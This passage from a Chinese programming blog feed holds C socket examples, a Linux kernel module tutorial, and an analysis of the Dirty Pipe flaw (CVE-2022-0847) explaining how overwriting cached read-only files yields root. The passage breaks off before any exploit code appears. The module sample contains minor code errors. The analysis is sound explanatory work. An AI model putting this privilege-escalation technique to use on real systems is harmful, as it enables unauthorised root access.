class="hljs-comment">//返回socket</span><br><span class="hljs-keyword">return</span> fd;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>** argv)</span><br>&#123;<br><span class="hljs-type">socklen_t</span> len = <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> sockaddr_in);<br><span class="hljs-keyword">if</span> (argc != <span class="hljs-number">3</span>) &#123;<br>Usage(argv[<span class="hljs-number">0</span>]);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><span class="hljs-type">int</span> fd = New_Socket(argv[<span class="hljs-number">1</span>], argv[<span class="hljs-number">2</span>], <span class="hljs-number">5</span>);<br><span class="hljs-comment">//定义客户端信息变量</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">client_addr</span>;</span><br><span class="hljs-comment">//接收来自客户端发来的请求</span><br><span class="hljs-type">int</span> clientfd = accept(fd, (<span class="hljs-keyword">struct</span> sockaddr*)&amp;client_addr, &amp;len);<br><span class="hljs-keyword">if</span> (clientfd == <span class="hljs-number">-1</span>) &#123;<br>perror(<span class="hljs-string">&quot;accept&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><span class="hljs-type">char</span> buffer[<span class="hljs-number">100</span>];<br>bzero(buffer, <span class="hljs-number">100</span>);<br><span class="hljs-comment">//接收来自客户端发来的数据</span><br><span class="hljs-keyword">if</span> (read(clientfd, buffer, <span class="hljs-number">100</span>) &gt; <span class="hljs-number">0</span>) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;recv from client:%s&quot;</span>, buffer);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>perror(<span class="hljs-string">&quot;read&quot;</span>);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//客户端</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;arpa/inet.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;netinet/in.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SOCKLEN (sizeof(struct sockaddr))</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">Usage</span><span class="hljs-params">(<span class="hljs-type">char</span>* argv)</span> <span class="hljs-comment">//使用帮助函数</span><br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Usage:\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s SERVERADDR SERVERPORT&quot;</span>, argv);<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">New_Socket</span><span class="hljs-params">(<span class="hljs-type">char</span>* addr, <span class="hljs-type">char</span>* port)</span> <span class="hljs-comment">//创建socket用于连接远程服务器</span><br>&#123;<br><span class="hljs-type">int</span> fd = socket(AF_INET, SOCK_STREAM, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (fd == <span class="hljs-number">-1</span>) &#123;<br>perror(<span class="hljs-string">&quot;socket&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">serveraddr</span>;</span><br>serveraddr.sin_family = AF_INET;<br>serveraddr.sin_port = htons(atoi(port));<br><span class="hljs-comment">//转换ip地址类型</span><br><span class="hljs-keyword">if</span> (inet_pton(AF_INET, addr, &amp;serveraddr.sin_addr) != <span class="hljs-number">1</span>) &#123;<br>perror(<span class="hljs-string">&quot;inet_pton&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br><span class="hljs-comment">//连接服务器</span><br><span class="hljs-keyword">if</span> (connect(fd, (<span class="hljs-keyword">struct</span> sockaddr*)&amp;serveraddr, SOCKLEN) != <span class="hljs-number">0</span>) &#123;<br>perror(<span class="hljs-string">&quot;connect&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br><span class="hljs-keyword">return</span> fd;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>** argv)</span><br>&#123;<br><span class="hljs-keyword">if</span> (argc != <span class="hljs-number">3</span>) &#123;<br>Usage(argv[<span class="hljs-number">0</span>]);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//创建socket</span><br><span class="hljs-type">int</span> fd = New_Socket(argv[<span class="hljs-number">1</span>], argv[<span class="hljs-number">2</span>]);<br><span class="hljs-keyword">if</span> (fd == <span class="hljs-number">-1</span>) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;connect server error!\n&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//定义发送数据</span><br><span class="hljs-type">char</span>* str = <span class="hljs-string">&quot;Hello,World&quot;</span>;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> len = <span class="hljs-built_in">strlen</span>(str) + <span class="hljs-number">1</span>;<br><span class="hljs-comment">//将数据写入socket发送缓冲区</span><br><span class="hljs-keyword">if</span> (write(fd, str, len) != len) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;send string to server error!\n&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;send string to server successful!\n&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>编程开发</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网络编程</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux设备驱动开发入门</title>
    <link href="/2022/04/17/Linux%E8%AE%BE%E5%A4%87%E9%A9%B1%E5%8A%A8%E5%BC%80%E5%8F%91%E5%85%A5%E9%97%A8/"/>
    <url>/2022/04/17/Linux%E8%AE%BE%E5%A4%87%E9%A9%B1%E5%8A%A8%E5%BC%80%E5%8F%91%E5%85%A5%E9%97%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="linux设备驱动开发入门"><a href="#linux设备驱动开发入门" class="headerlink" title="linux设备驱动开发入门"></a>linux设备驱动开发入门</h1><h3 id="1-linux内核模块开发入门"><a href="#1-linux内核模块开发入门" class="headerlink" title="1.linux内核模块开发入门"></a>1.linux内核模块开发入门</h3><p>基本步骤</p><pre><code class=" mermaid">graph LR;a(编写内核模块代码)--&gt;b(修改该目录下的Kconfig文件和Makefile)--&gt;c(运行内核模块)</code></pre><h6 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/kernel.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/module.h&gt;</span></span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">__init 和__exit为两个宏</span><br><span class="hljs-comment">*/</span><br><span class="hljs-comment">// EXPORT_SYMBOL(gx);(声明符号表，使得该变量或者函数可以被其他模块调用)</span><br><span class="hljs-type">int</span> a = <span class="hljs-number">1</span>;<br><span class="hljs-type">char</span> *b = <span class="hljs-string">&quot;hello&quot;</span>;<br><span class="hljs-type">int</span> c[<span class="hljs-number">5</span>] = &#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>&#125;;<br>module_param(a,<span class="hljs-type">int</span>,<span class="hljs-number">0664</span>);<span class="hljs-comment">//内核模块传参,传参后内核函数可以直接使用这些参数</span><br>module_param(b,charp,<span class="hljs-number">0664</span>);<br>module_param(c,<span class="hljs-type">int</span>,<span class="hljs-literal">NULL</span>,<span class="hljs-number">0664</span>);<br><span class="hljs-type">int</span> __init <span class="hljs-title function_">my_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>    <span class="hljs-comment">//init函数必须为int类型</span><br>&#123;<br>    printk(<span class="hljs-string">&quot;just a test for linux kernel module test!\n&quot;</span>);<br>    printk(<span class="hljs-string">&quot;my init linux kernel module is running!\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-type">void</span> __exit <span class="hljs-title function_">my_exit</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-comment">//exit函数必须为void类型</span><br>    printk(<span class="hljs-string">&quot;just a test for linux kernel module test!\n&quot;</span>);<br><br>&#125;<br>module_init(my_init);<br><span class="hljs-comment">//当该内核模块插入时将会执行my_init函数</span><br>module_exit(my_exit);<br><span class="hljs-comment">//当该内核模块移除时将会执行my_exit函数</span><br>MODULE_LICENCE(<span class="hljs-string">&quot;GPL&quot;</span>);<span class="hljs-comment">//指定模块的开源协议</span><br>MODULE_AUTHOR(<span class="hljs-string">&quot;bugprogram-git&quot;</span>);<span class="hljs-comment">//指定模块的作者</span><br>MODULE_DESCRIPTION(<span class="hljs-string">&quot;just a kernel module test&quot;</span>);<span class="hljs-comment">//指定内核模块的详细信息</span><br>MODULE_ALIAS(<span class="hljs-string">&quot;mymodule&quot;</span>);<span class="hljs-comment">//指定模块的别名</span><br><span class="hljs-comment">//这些MODLE_*的本质其实是定义在static字符数组用于存放指定字符串内容，这些字符串内容链接时存放在.modinfo字段,可以用modinfo命令来查看这些模块信息,用法</span><br>modinfo $(MODULE_NAME)<span class="hljs-comment">//查看某个模块的信息</span><br></code></pre></td></tr></table></figure><h3 id="2-修改模块代码所在的目录的Kconfig文件"><a href="#2-修改模块代码所在的目录的Kconfig文件" class="headerlink" title="2.修改模块代码所在的目录的Kconfig文件"></a>2.修改模块代码所在的目录的Kconfig文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">config MY_MODULE<br>    tristate <span class="hljs-string">&quot;this is the linux kernel moule for test&quot;</span><br>    <span class="hljs-built_in">help</span><br>        just a <span class="hljs-built_in">test</span><br></code></pre></td></tr></table></figure><h3 id="3-修改该目录下的Makefile文件"><a href="#3-修改该目录下的Makefile文件" class="headerlink" title="3.修改该目录下的Makefile文件"></a>3.修改该目录下的Makefile文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">obj-$(CONFIG_MY_MODULE)         += module.o<br><span class="hljs-comment">#(这里的module.o要和.c文件的文件名一致,MY_MODULE要和Kconfig文件里面的指定一致)</span><br></code></pre></td></tr></table></figure><h3 id="4-运行内核模块"><a href="#4-运行内核模块" class="headerlink" title="4.运行内核模块"></a>4.运行内核模块</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">dmesg -C    <span class="hljs-comment">#清除内核已打印的信息</span><br>dmesg       <span class="hljs-comment">#查看内核打印信息</span><br>lsmod<span class="hljs-comment">#显示当前系统已经载入的模块</span><br>insmod<span class="hljs-comment">#将某个模块运行</span><br>dmesg<span class="hljs-comment">#查看内核打印信息</span><br></code></pre></td></tr></table></figure><h2 id="linux设备驱动开发"><a href="#linux设备驱动开发" class="headerlink" title="linux设备驱动开发"></a>linux设备驱动开发</h2><p>linux内核用设备号来区分不同的设备,设备号是一个32位的无符号整数,dev_t类型,而且设备号可以分为两个部分,</p><ul><li><p>1.主设备号</p><p>占12位</p></li><li><p>2.次设备号</p><p>占20位</p></li></ul><h4 id="常用的api"><a href="#常用的api" class="headerlink" title="常用的api"></a>常用的api</h4>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c">MAJOR(<span class="hljs-type">dev_t</span> dev);<br><span class="hljs-comment">//获取设备号的主设备号</span><br>MINOR(<span class="hljs-type">dev_t</span> dev);<br><span class="hljs-comment">//获取设备的次设备号</span><br>MKDEV(<span class="hljs-type">int</span> major,<span class="hljs-type">int</span> minor);<br><span class="hljs-comment">//创建一个设备</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">register_chrdev_region</span><span class="hljs-params">(<span class="hljs-type">dev_t</span> from,<span class="hljs-type">unsigned</span> count,<span class="hljs-type">char</span> *name)</span>;<br><span class="hljs-comment">//手动注册一个设备到内核</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">alloc_chrdev_regionda</span><span class="hljs-params">(<span class="hljs-type">dev_t</span> *dev,<span class="hljs-type">unsigned</span> baseminor,<span class="hljs-type">unsigned</span> count,<span class="hljs-type">const</span> <span class="hljs-type">char</span> *name)</span>;<br><br><span class="hljs-comment">//只需要主次设备号和fops即可注册设备</span><br><span class="hljs-type">int</span> __register_chrdev(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> major, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> baseminor,<br>      <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> count, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *name,<br>      <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> file_operations *fops)<br><span class="hljs-type">void</span> <span class="hljs-title function_">unregister_chrdev_region</span><span class="hljs-params">(<span class="hljs-type">dev_t</span> from,<span class="hljs-type">unsigned</span> count)</span>;<br><span class="hljs-comment">//注销一个设备</span><br><span class="hljs-comment">//动态注册一个设备到内核中</span><br><span class="hljs-comment">//分配成功后会在/proc/devices中查看到设备号对应的设备名称</span><br>cdev_alloc(<span class="hljs-type">void</span>);<br>cdev_init(<span class="hljs-keyword">struct</span> cdev *dev,<span class="hljs-keyword">struct</span> file_operations *fops);<br>cdev_add(<span class="hljs-keyword">struct</span> cdev *dev,<span class="hljs-type">dev_t</span> devnum,<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> count);<br>cdev_del(<span class="hljs-keyword">struct</span> cdev *dev);<br><span class="hljs-comment">//将数据从内核空间拷贝到用户空间</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-title function_">copy_to_user</span><span class="hljs-params">(<span class="hljs-type">void</span> __user *to,<span class="hljs-type">const</span> <span class="hljs-type">void</span> *from,<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> n)</span>;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-title function_">copy_from_user</span><span class="hljs-params">(<span class="hljs-type">void</span> *to,<span class="hljs-type">void</span> *from,<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> n)</span>;<br></code></pre></td></tr></table></figure><h4 id="基本步骤"><a href="#基本步骤" class="headerlink" title="基本步骤"></a>基本步骤</h4>  <pre><code class=" mermaid">graph LR;a(申请设备号)--&gt;b(注册设备号)--&gt;c(设置设备对应的file_ops)--&gt;d(将其加入到内核的链表中)</code></pre>]]></content>
    
    
    <categories>
      
      <category>软件开发</category>
      
    </categories>
    
    
    <tags>
      
      <tag>linux内核驱动开发编程</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2022-0847漏洞原理及复现</title>
    <link href="/2022/04/17/CVE-2022-0847%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%8F%8A%E5%A4%8D%E7%8E%B0/"/>
    <url>/2022/04/17/CVE-2022-0847%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%8F%8A%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="CVE-2022-0847漏洞原理及复现"><a href="#CVE-2022-0847漏洞原理及复现" class="headerlink" title="CVE-2022-0847漏洞原理及复现"></a>CVE-2022-0847漏洞原理及复现</h1><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>由于内核中copy_page_to_iter_pipe和push_pipe函数的正确初始化存在缺陷,可能存在旧值,攻击者可以利用此漏洞对任意只读文件缓存页进行覆盖,缓存会在系统内保留一段时间,在这段时间内系统的其他进程访问到的该文件内容都是攻击者修改过的文件缓存区的内容,从而将普通用户权限提升至root权限</p><h3 id="受影响的linux内核版本"><a href="#受影响的linux内核版本" class="headerlink" title="受影响的linux内核版本"></a>受影响的linux内核版本</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">5.8 &lt;= Linux Kernel &lt; 5.16.11 / 5.15.25 / 5.10.102<br></code></pre></td></tr></table></figure><h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">size_t</span> <span class="hljs-title function_">pipe_write</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kiocb *iocb,<span class="hljs-keyword">struct</span> iov_iter *from)</span><br>&#123;<br>    ....<br>    <span class="hljs-keyword">if</span> (chars &amp;&amp; !was_empty) &#123;<br>        <span class="hljs-comment">//如果缓存不为空则继续写</span><br>                 <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> mask = pipe-&gt;ring_size - <span class="hljs-number">1</span>;<br>                 <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">buf</span> =</span> &amp;pipe-&gt;bufs[(head - <span class="hljs-number">1</span>) &amp; mask];<br>                 <span class="hljs-type">int</span> offset = buf-&gt;offset + buf-&gt;len;<br><br>                <span class="hljs-comment">//这里判断有没有设置PIPE_BUF_FLAG_CAN_MERGE标志位,有该标志位则可以写(如果该位置空间不够则另开一块空间写)</span><br>                 <span class="hljs-keyword">if</span> ((buf-&gt;flags &amp; PIPE_BUF_FLAG_CAN_MERGE) &amp;&amp;<br>                     offset + chars &lt;= PAGE_SIZE) &#123;<br>                         ret = pipe_buf_confirm(pipe, buf);<br>                         <span class="hljs-keyword">if</span> (ret)<br>                                 <span class="hljs-keyword">goto</span> out;<br>                        <span class="hljs-comment">//写入内容</span><br>                         ret = copy_page_from_iter(buf-&gt;page, offset, chars, from);<br>                         <span class="hljs-keyword">if</span> (unlikely(ret &lt; chars)) &#123;<br>                                 ret = -EFAULT;<br>                                 <span class="hljs-keyword">goto</span> out;<br>                         &#125;<br><br>                         buf-&gt;len += ret;<br>                         <span class="hljs-keyword">if</span> (!iov_iter_count(from))<br>                                 <span class="hljs-keyword">goto</span> out;<br>                 &#125;<br>         &#125;<br><br>         <span class="hljs-keyword">for</span> (;;) &#123;<br>                 <span class="hljs-keyword">if</span> (!pipe-&gt;readers) &#123;<br>                         send_sig(SIGPIPE, current, <span class="hljs-number">0</span>);<br>                         <span class="hljs-keyword">if</span> (!ret)<br>                                 ret = -EPIPE;<br>                         <span class="hljs-keyword">break</span>;<br>                 &#125;<br><br>                 head = pipe-&gt;head;<br>&#125;<br></code></pre></td></tr></table></figure><p>在调用spice函数的时候会调用copy_page_to_iter_pipe函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">size_t</span> <span class="hljs-title function_">copy_page_to_iter_pipe</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> page *page, <span class="hljs-type">size_t</span> offset, <span class="hljs-type">size_t</span> bytes,</span><br><span class="hljs-params">                          <span class="hljs-keyword">struct</span> iov_iter *i)</span><br>&#123;<br>         <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span> *<span class="hljs-title">pipe</span> =</span> i-&gt;pipe;<br>         <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">buf</span>;</span><br>         <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> p_tail = pipe-&gt;tail;<br>         <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> p_mask = pipe-&gt;ring_size - <span class="hljs-number">1</span>;<br>         <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i_head = i-&gt;head;<br>                          buf = &amp;pipe-&gt;bufs[i_head &amp; p_mask];<br>         &#125;<br>         <span class="hljs-keyword">if</span> (pipe_full(i_head, p_tail, pipe-&gt;max_usage))<br>                 <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>         buf-&gt;ops = &amp;page_cache_pipe_buf_ops;<br>         get_page(page);<br>         <span class="hljs-comment">//这里没有初始化标志位</span><br>         buf-&gt;page = page;<br>         buf-&gt;offset = offset;<br>         buf-&gt;len = bytes;<br><br>         pipe-&gt;head = i_head + <span class="hljs-number">1</span>;<br>         i-&gt;iov_offset = offset + bytes;<br>         i-&gt;head = i_head;<br> out:<br>          i-&gt;count -= bytes;<br>         <span class="hljs-keyword">return</span> bytes;<br> &#125;<br></code></pre></td></tr></table></figure><h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>在调用函数spice的时候,系统会直接将缓存页替换成文件缓存页,并且没有初始化标志位,,由于spice函数在置换缓存页的时候没有对标志位进行初始化,所以该文件缓存页就会被误认为普通的缓存页，如果往管道里面写数据,就会把文件缓存页覆盖,缓存页会在系统内保存一段时间,导致后面访问的进程得到的该文件内容都是攻击者篡改的文件内容,以此可以通过覆盖关键文件达到提权的目的</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span 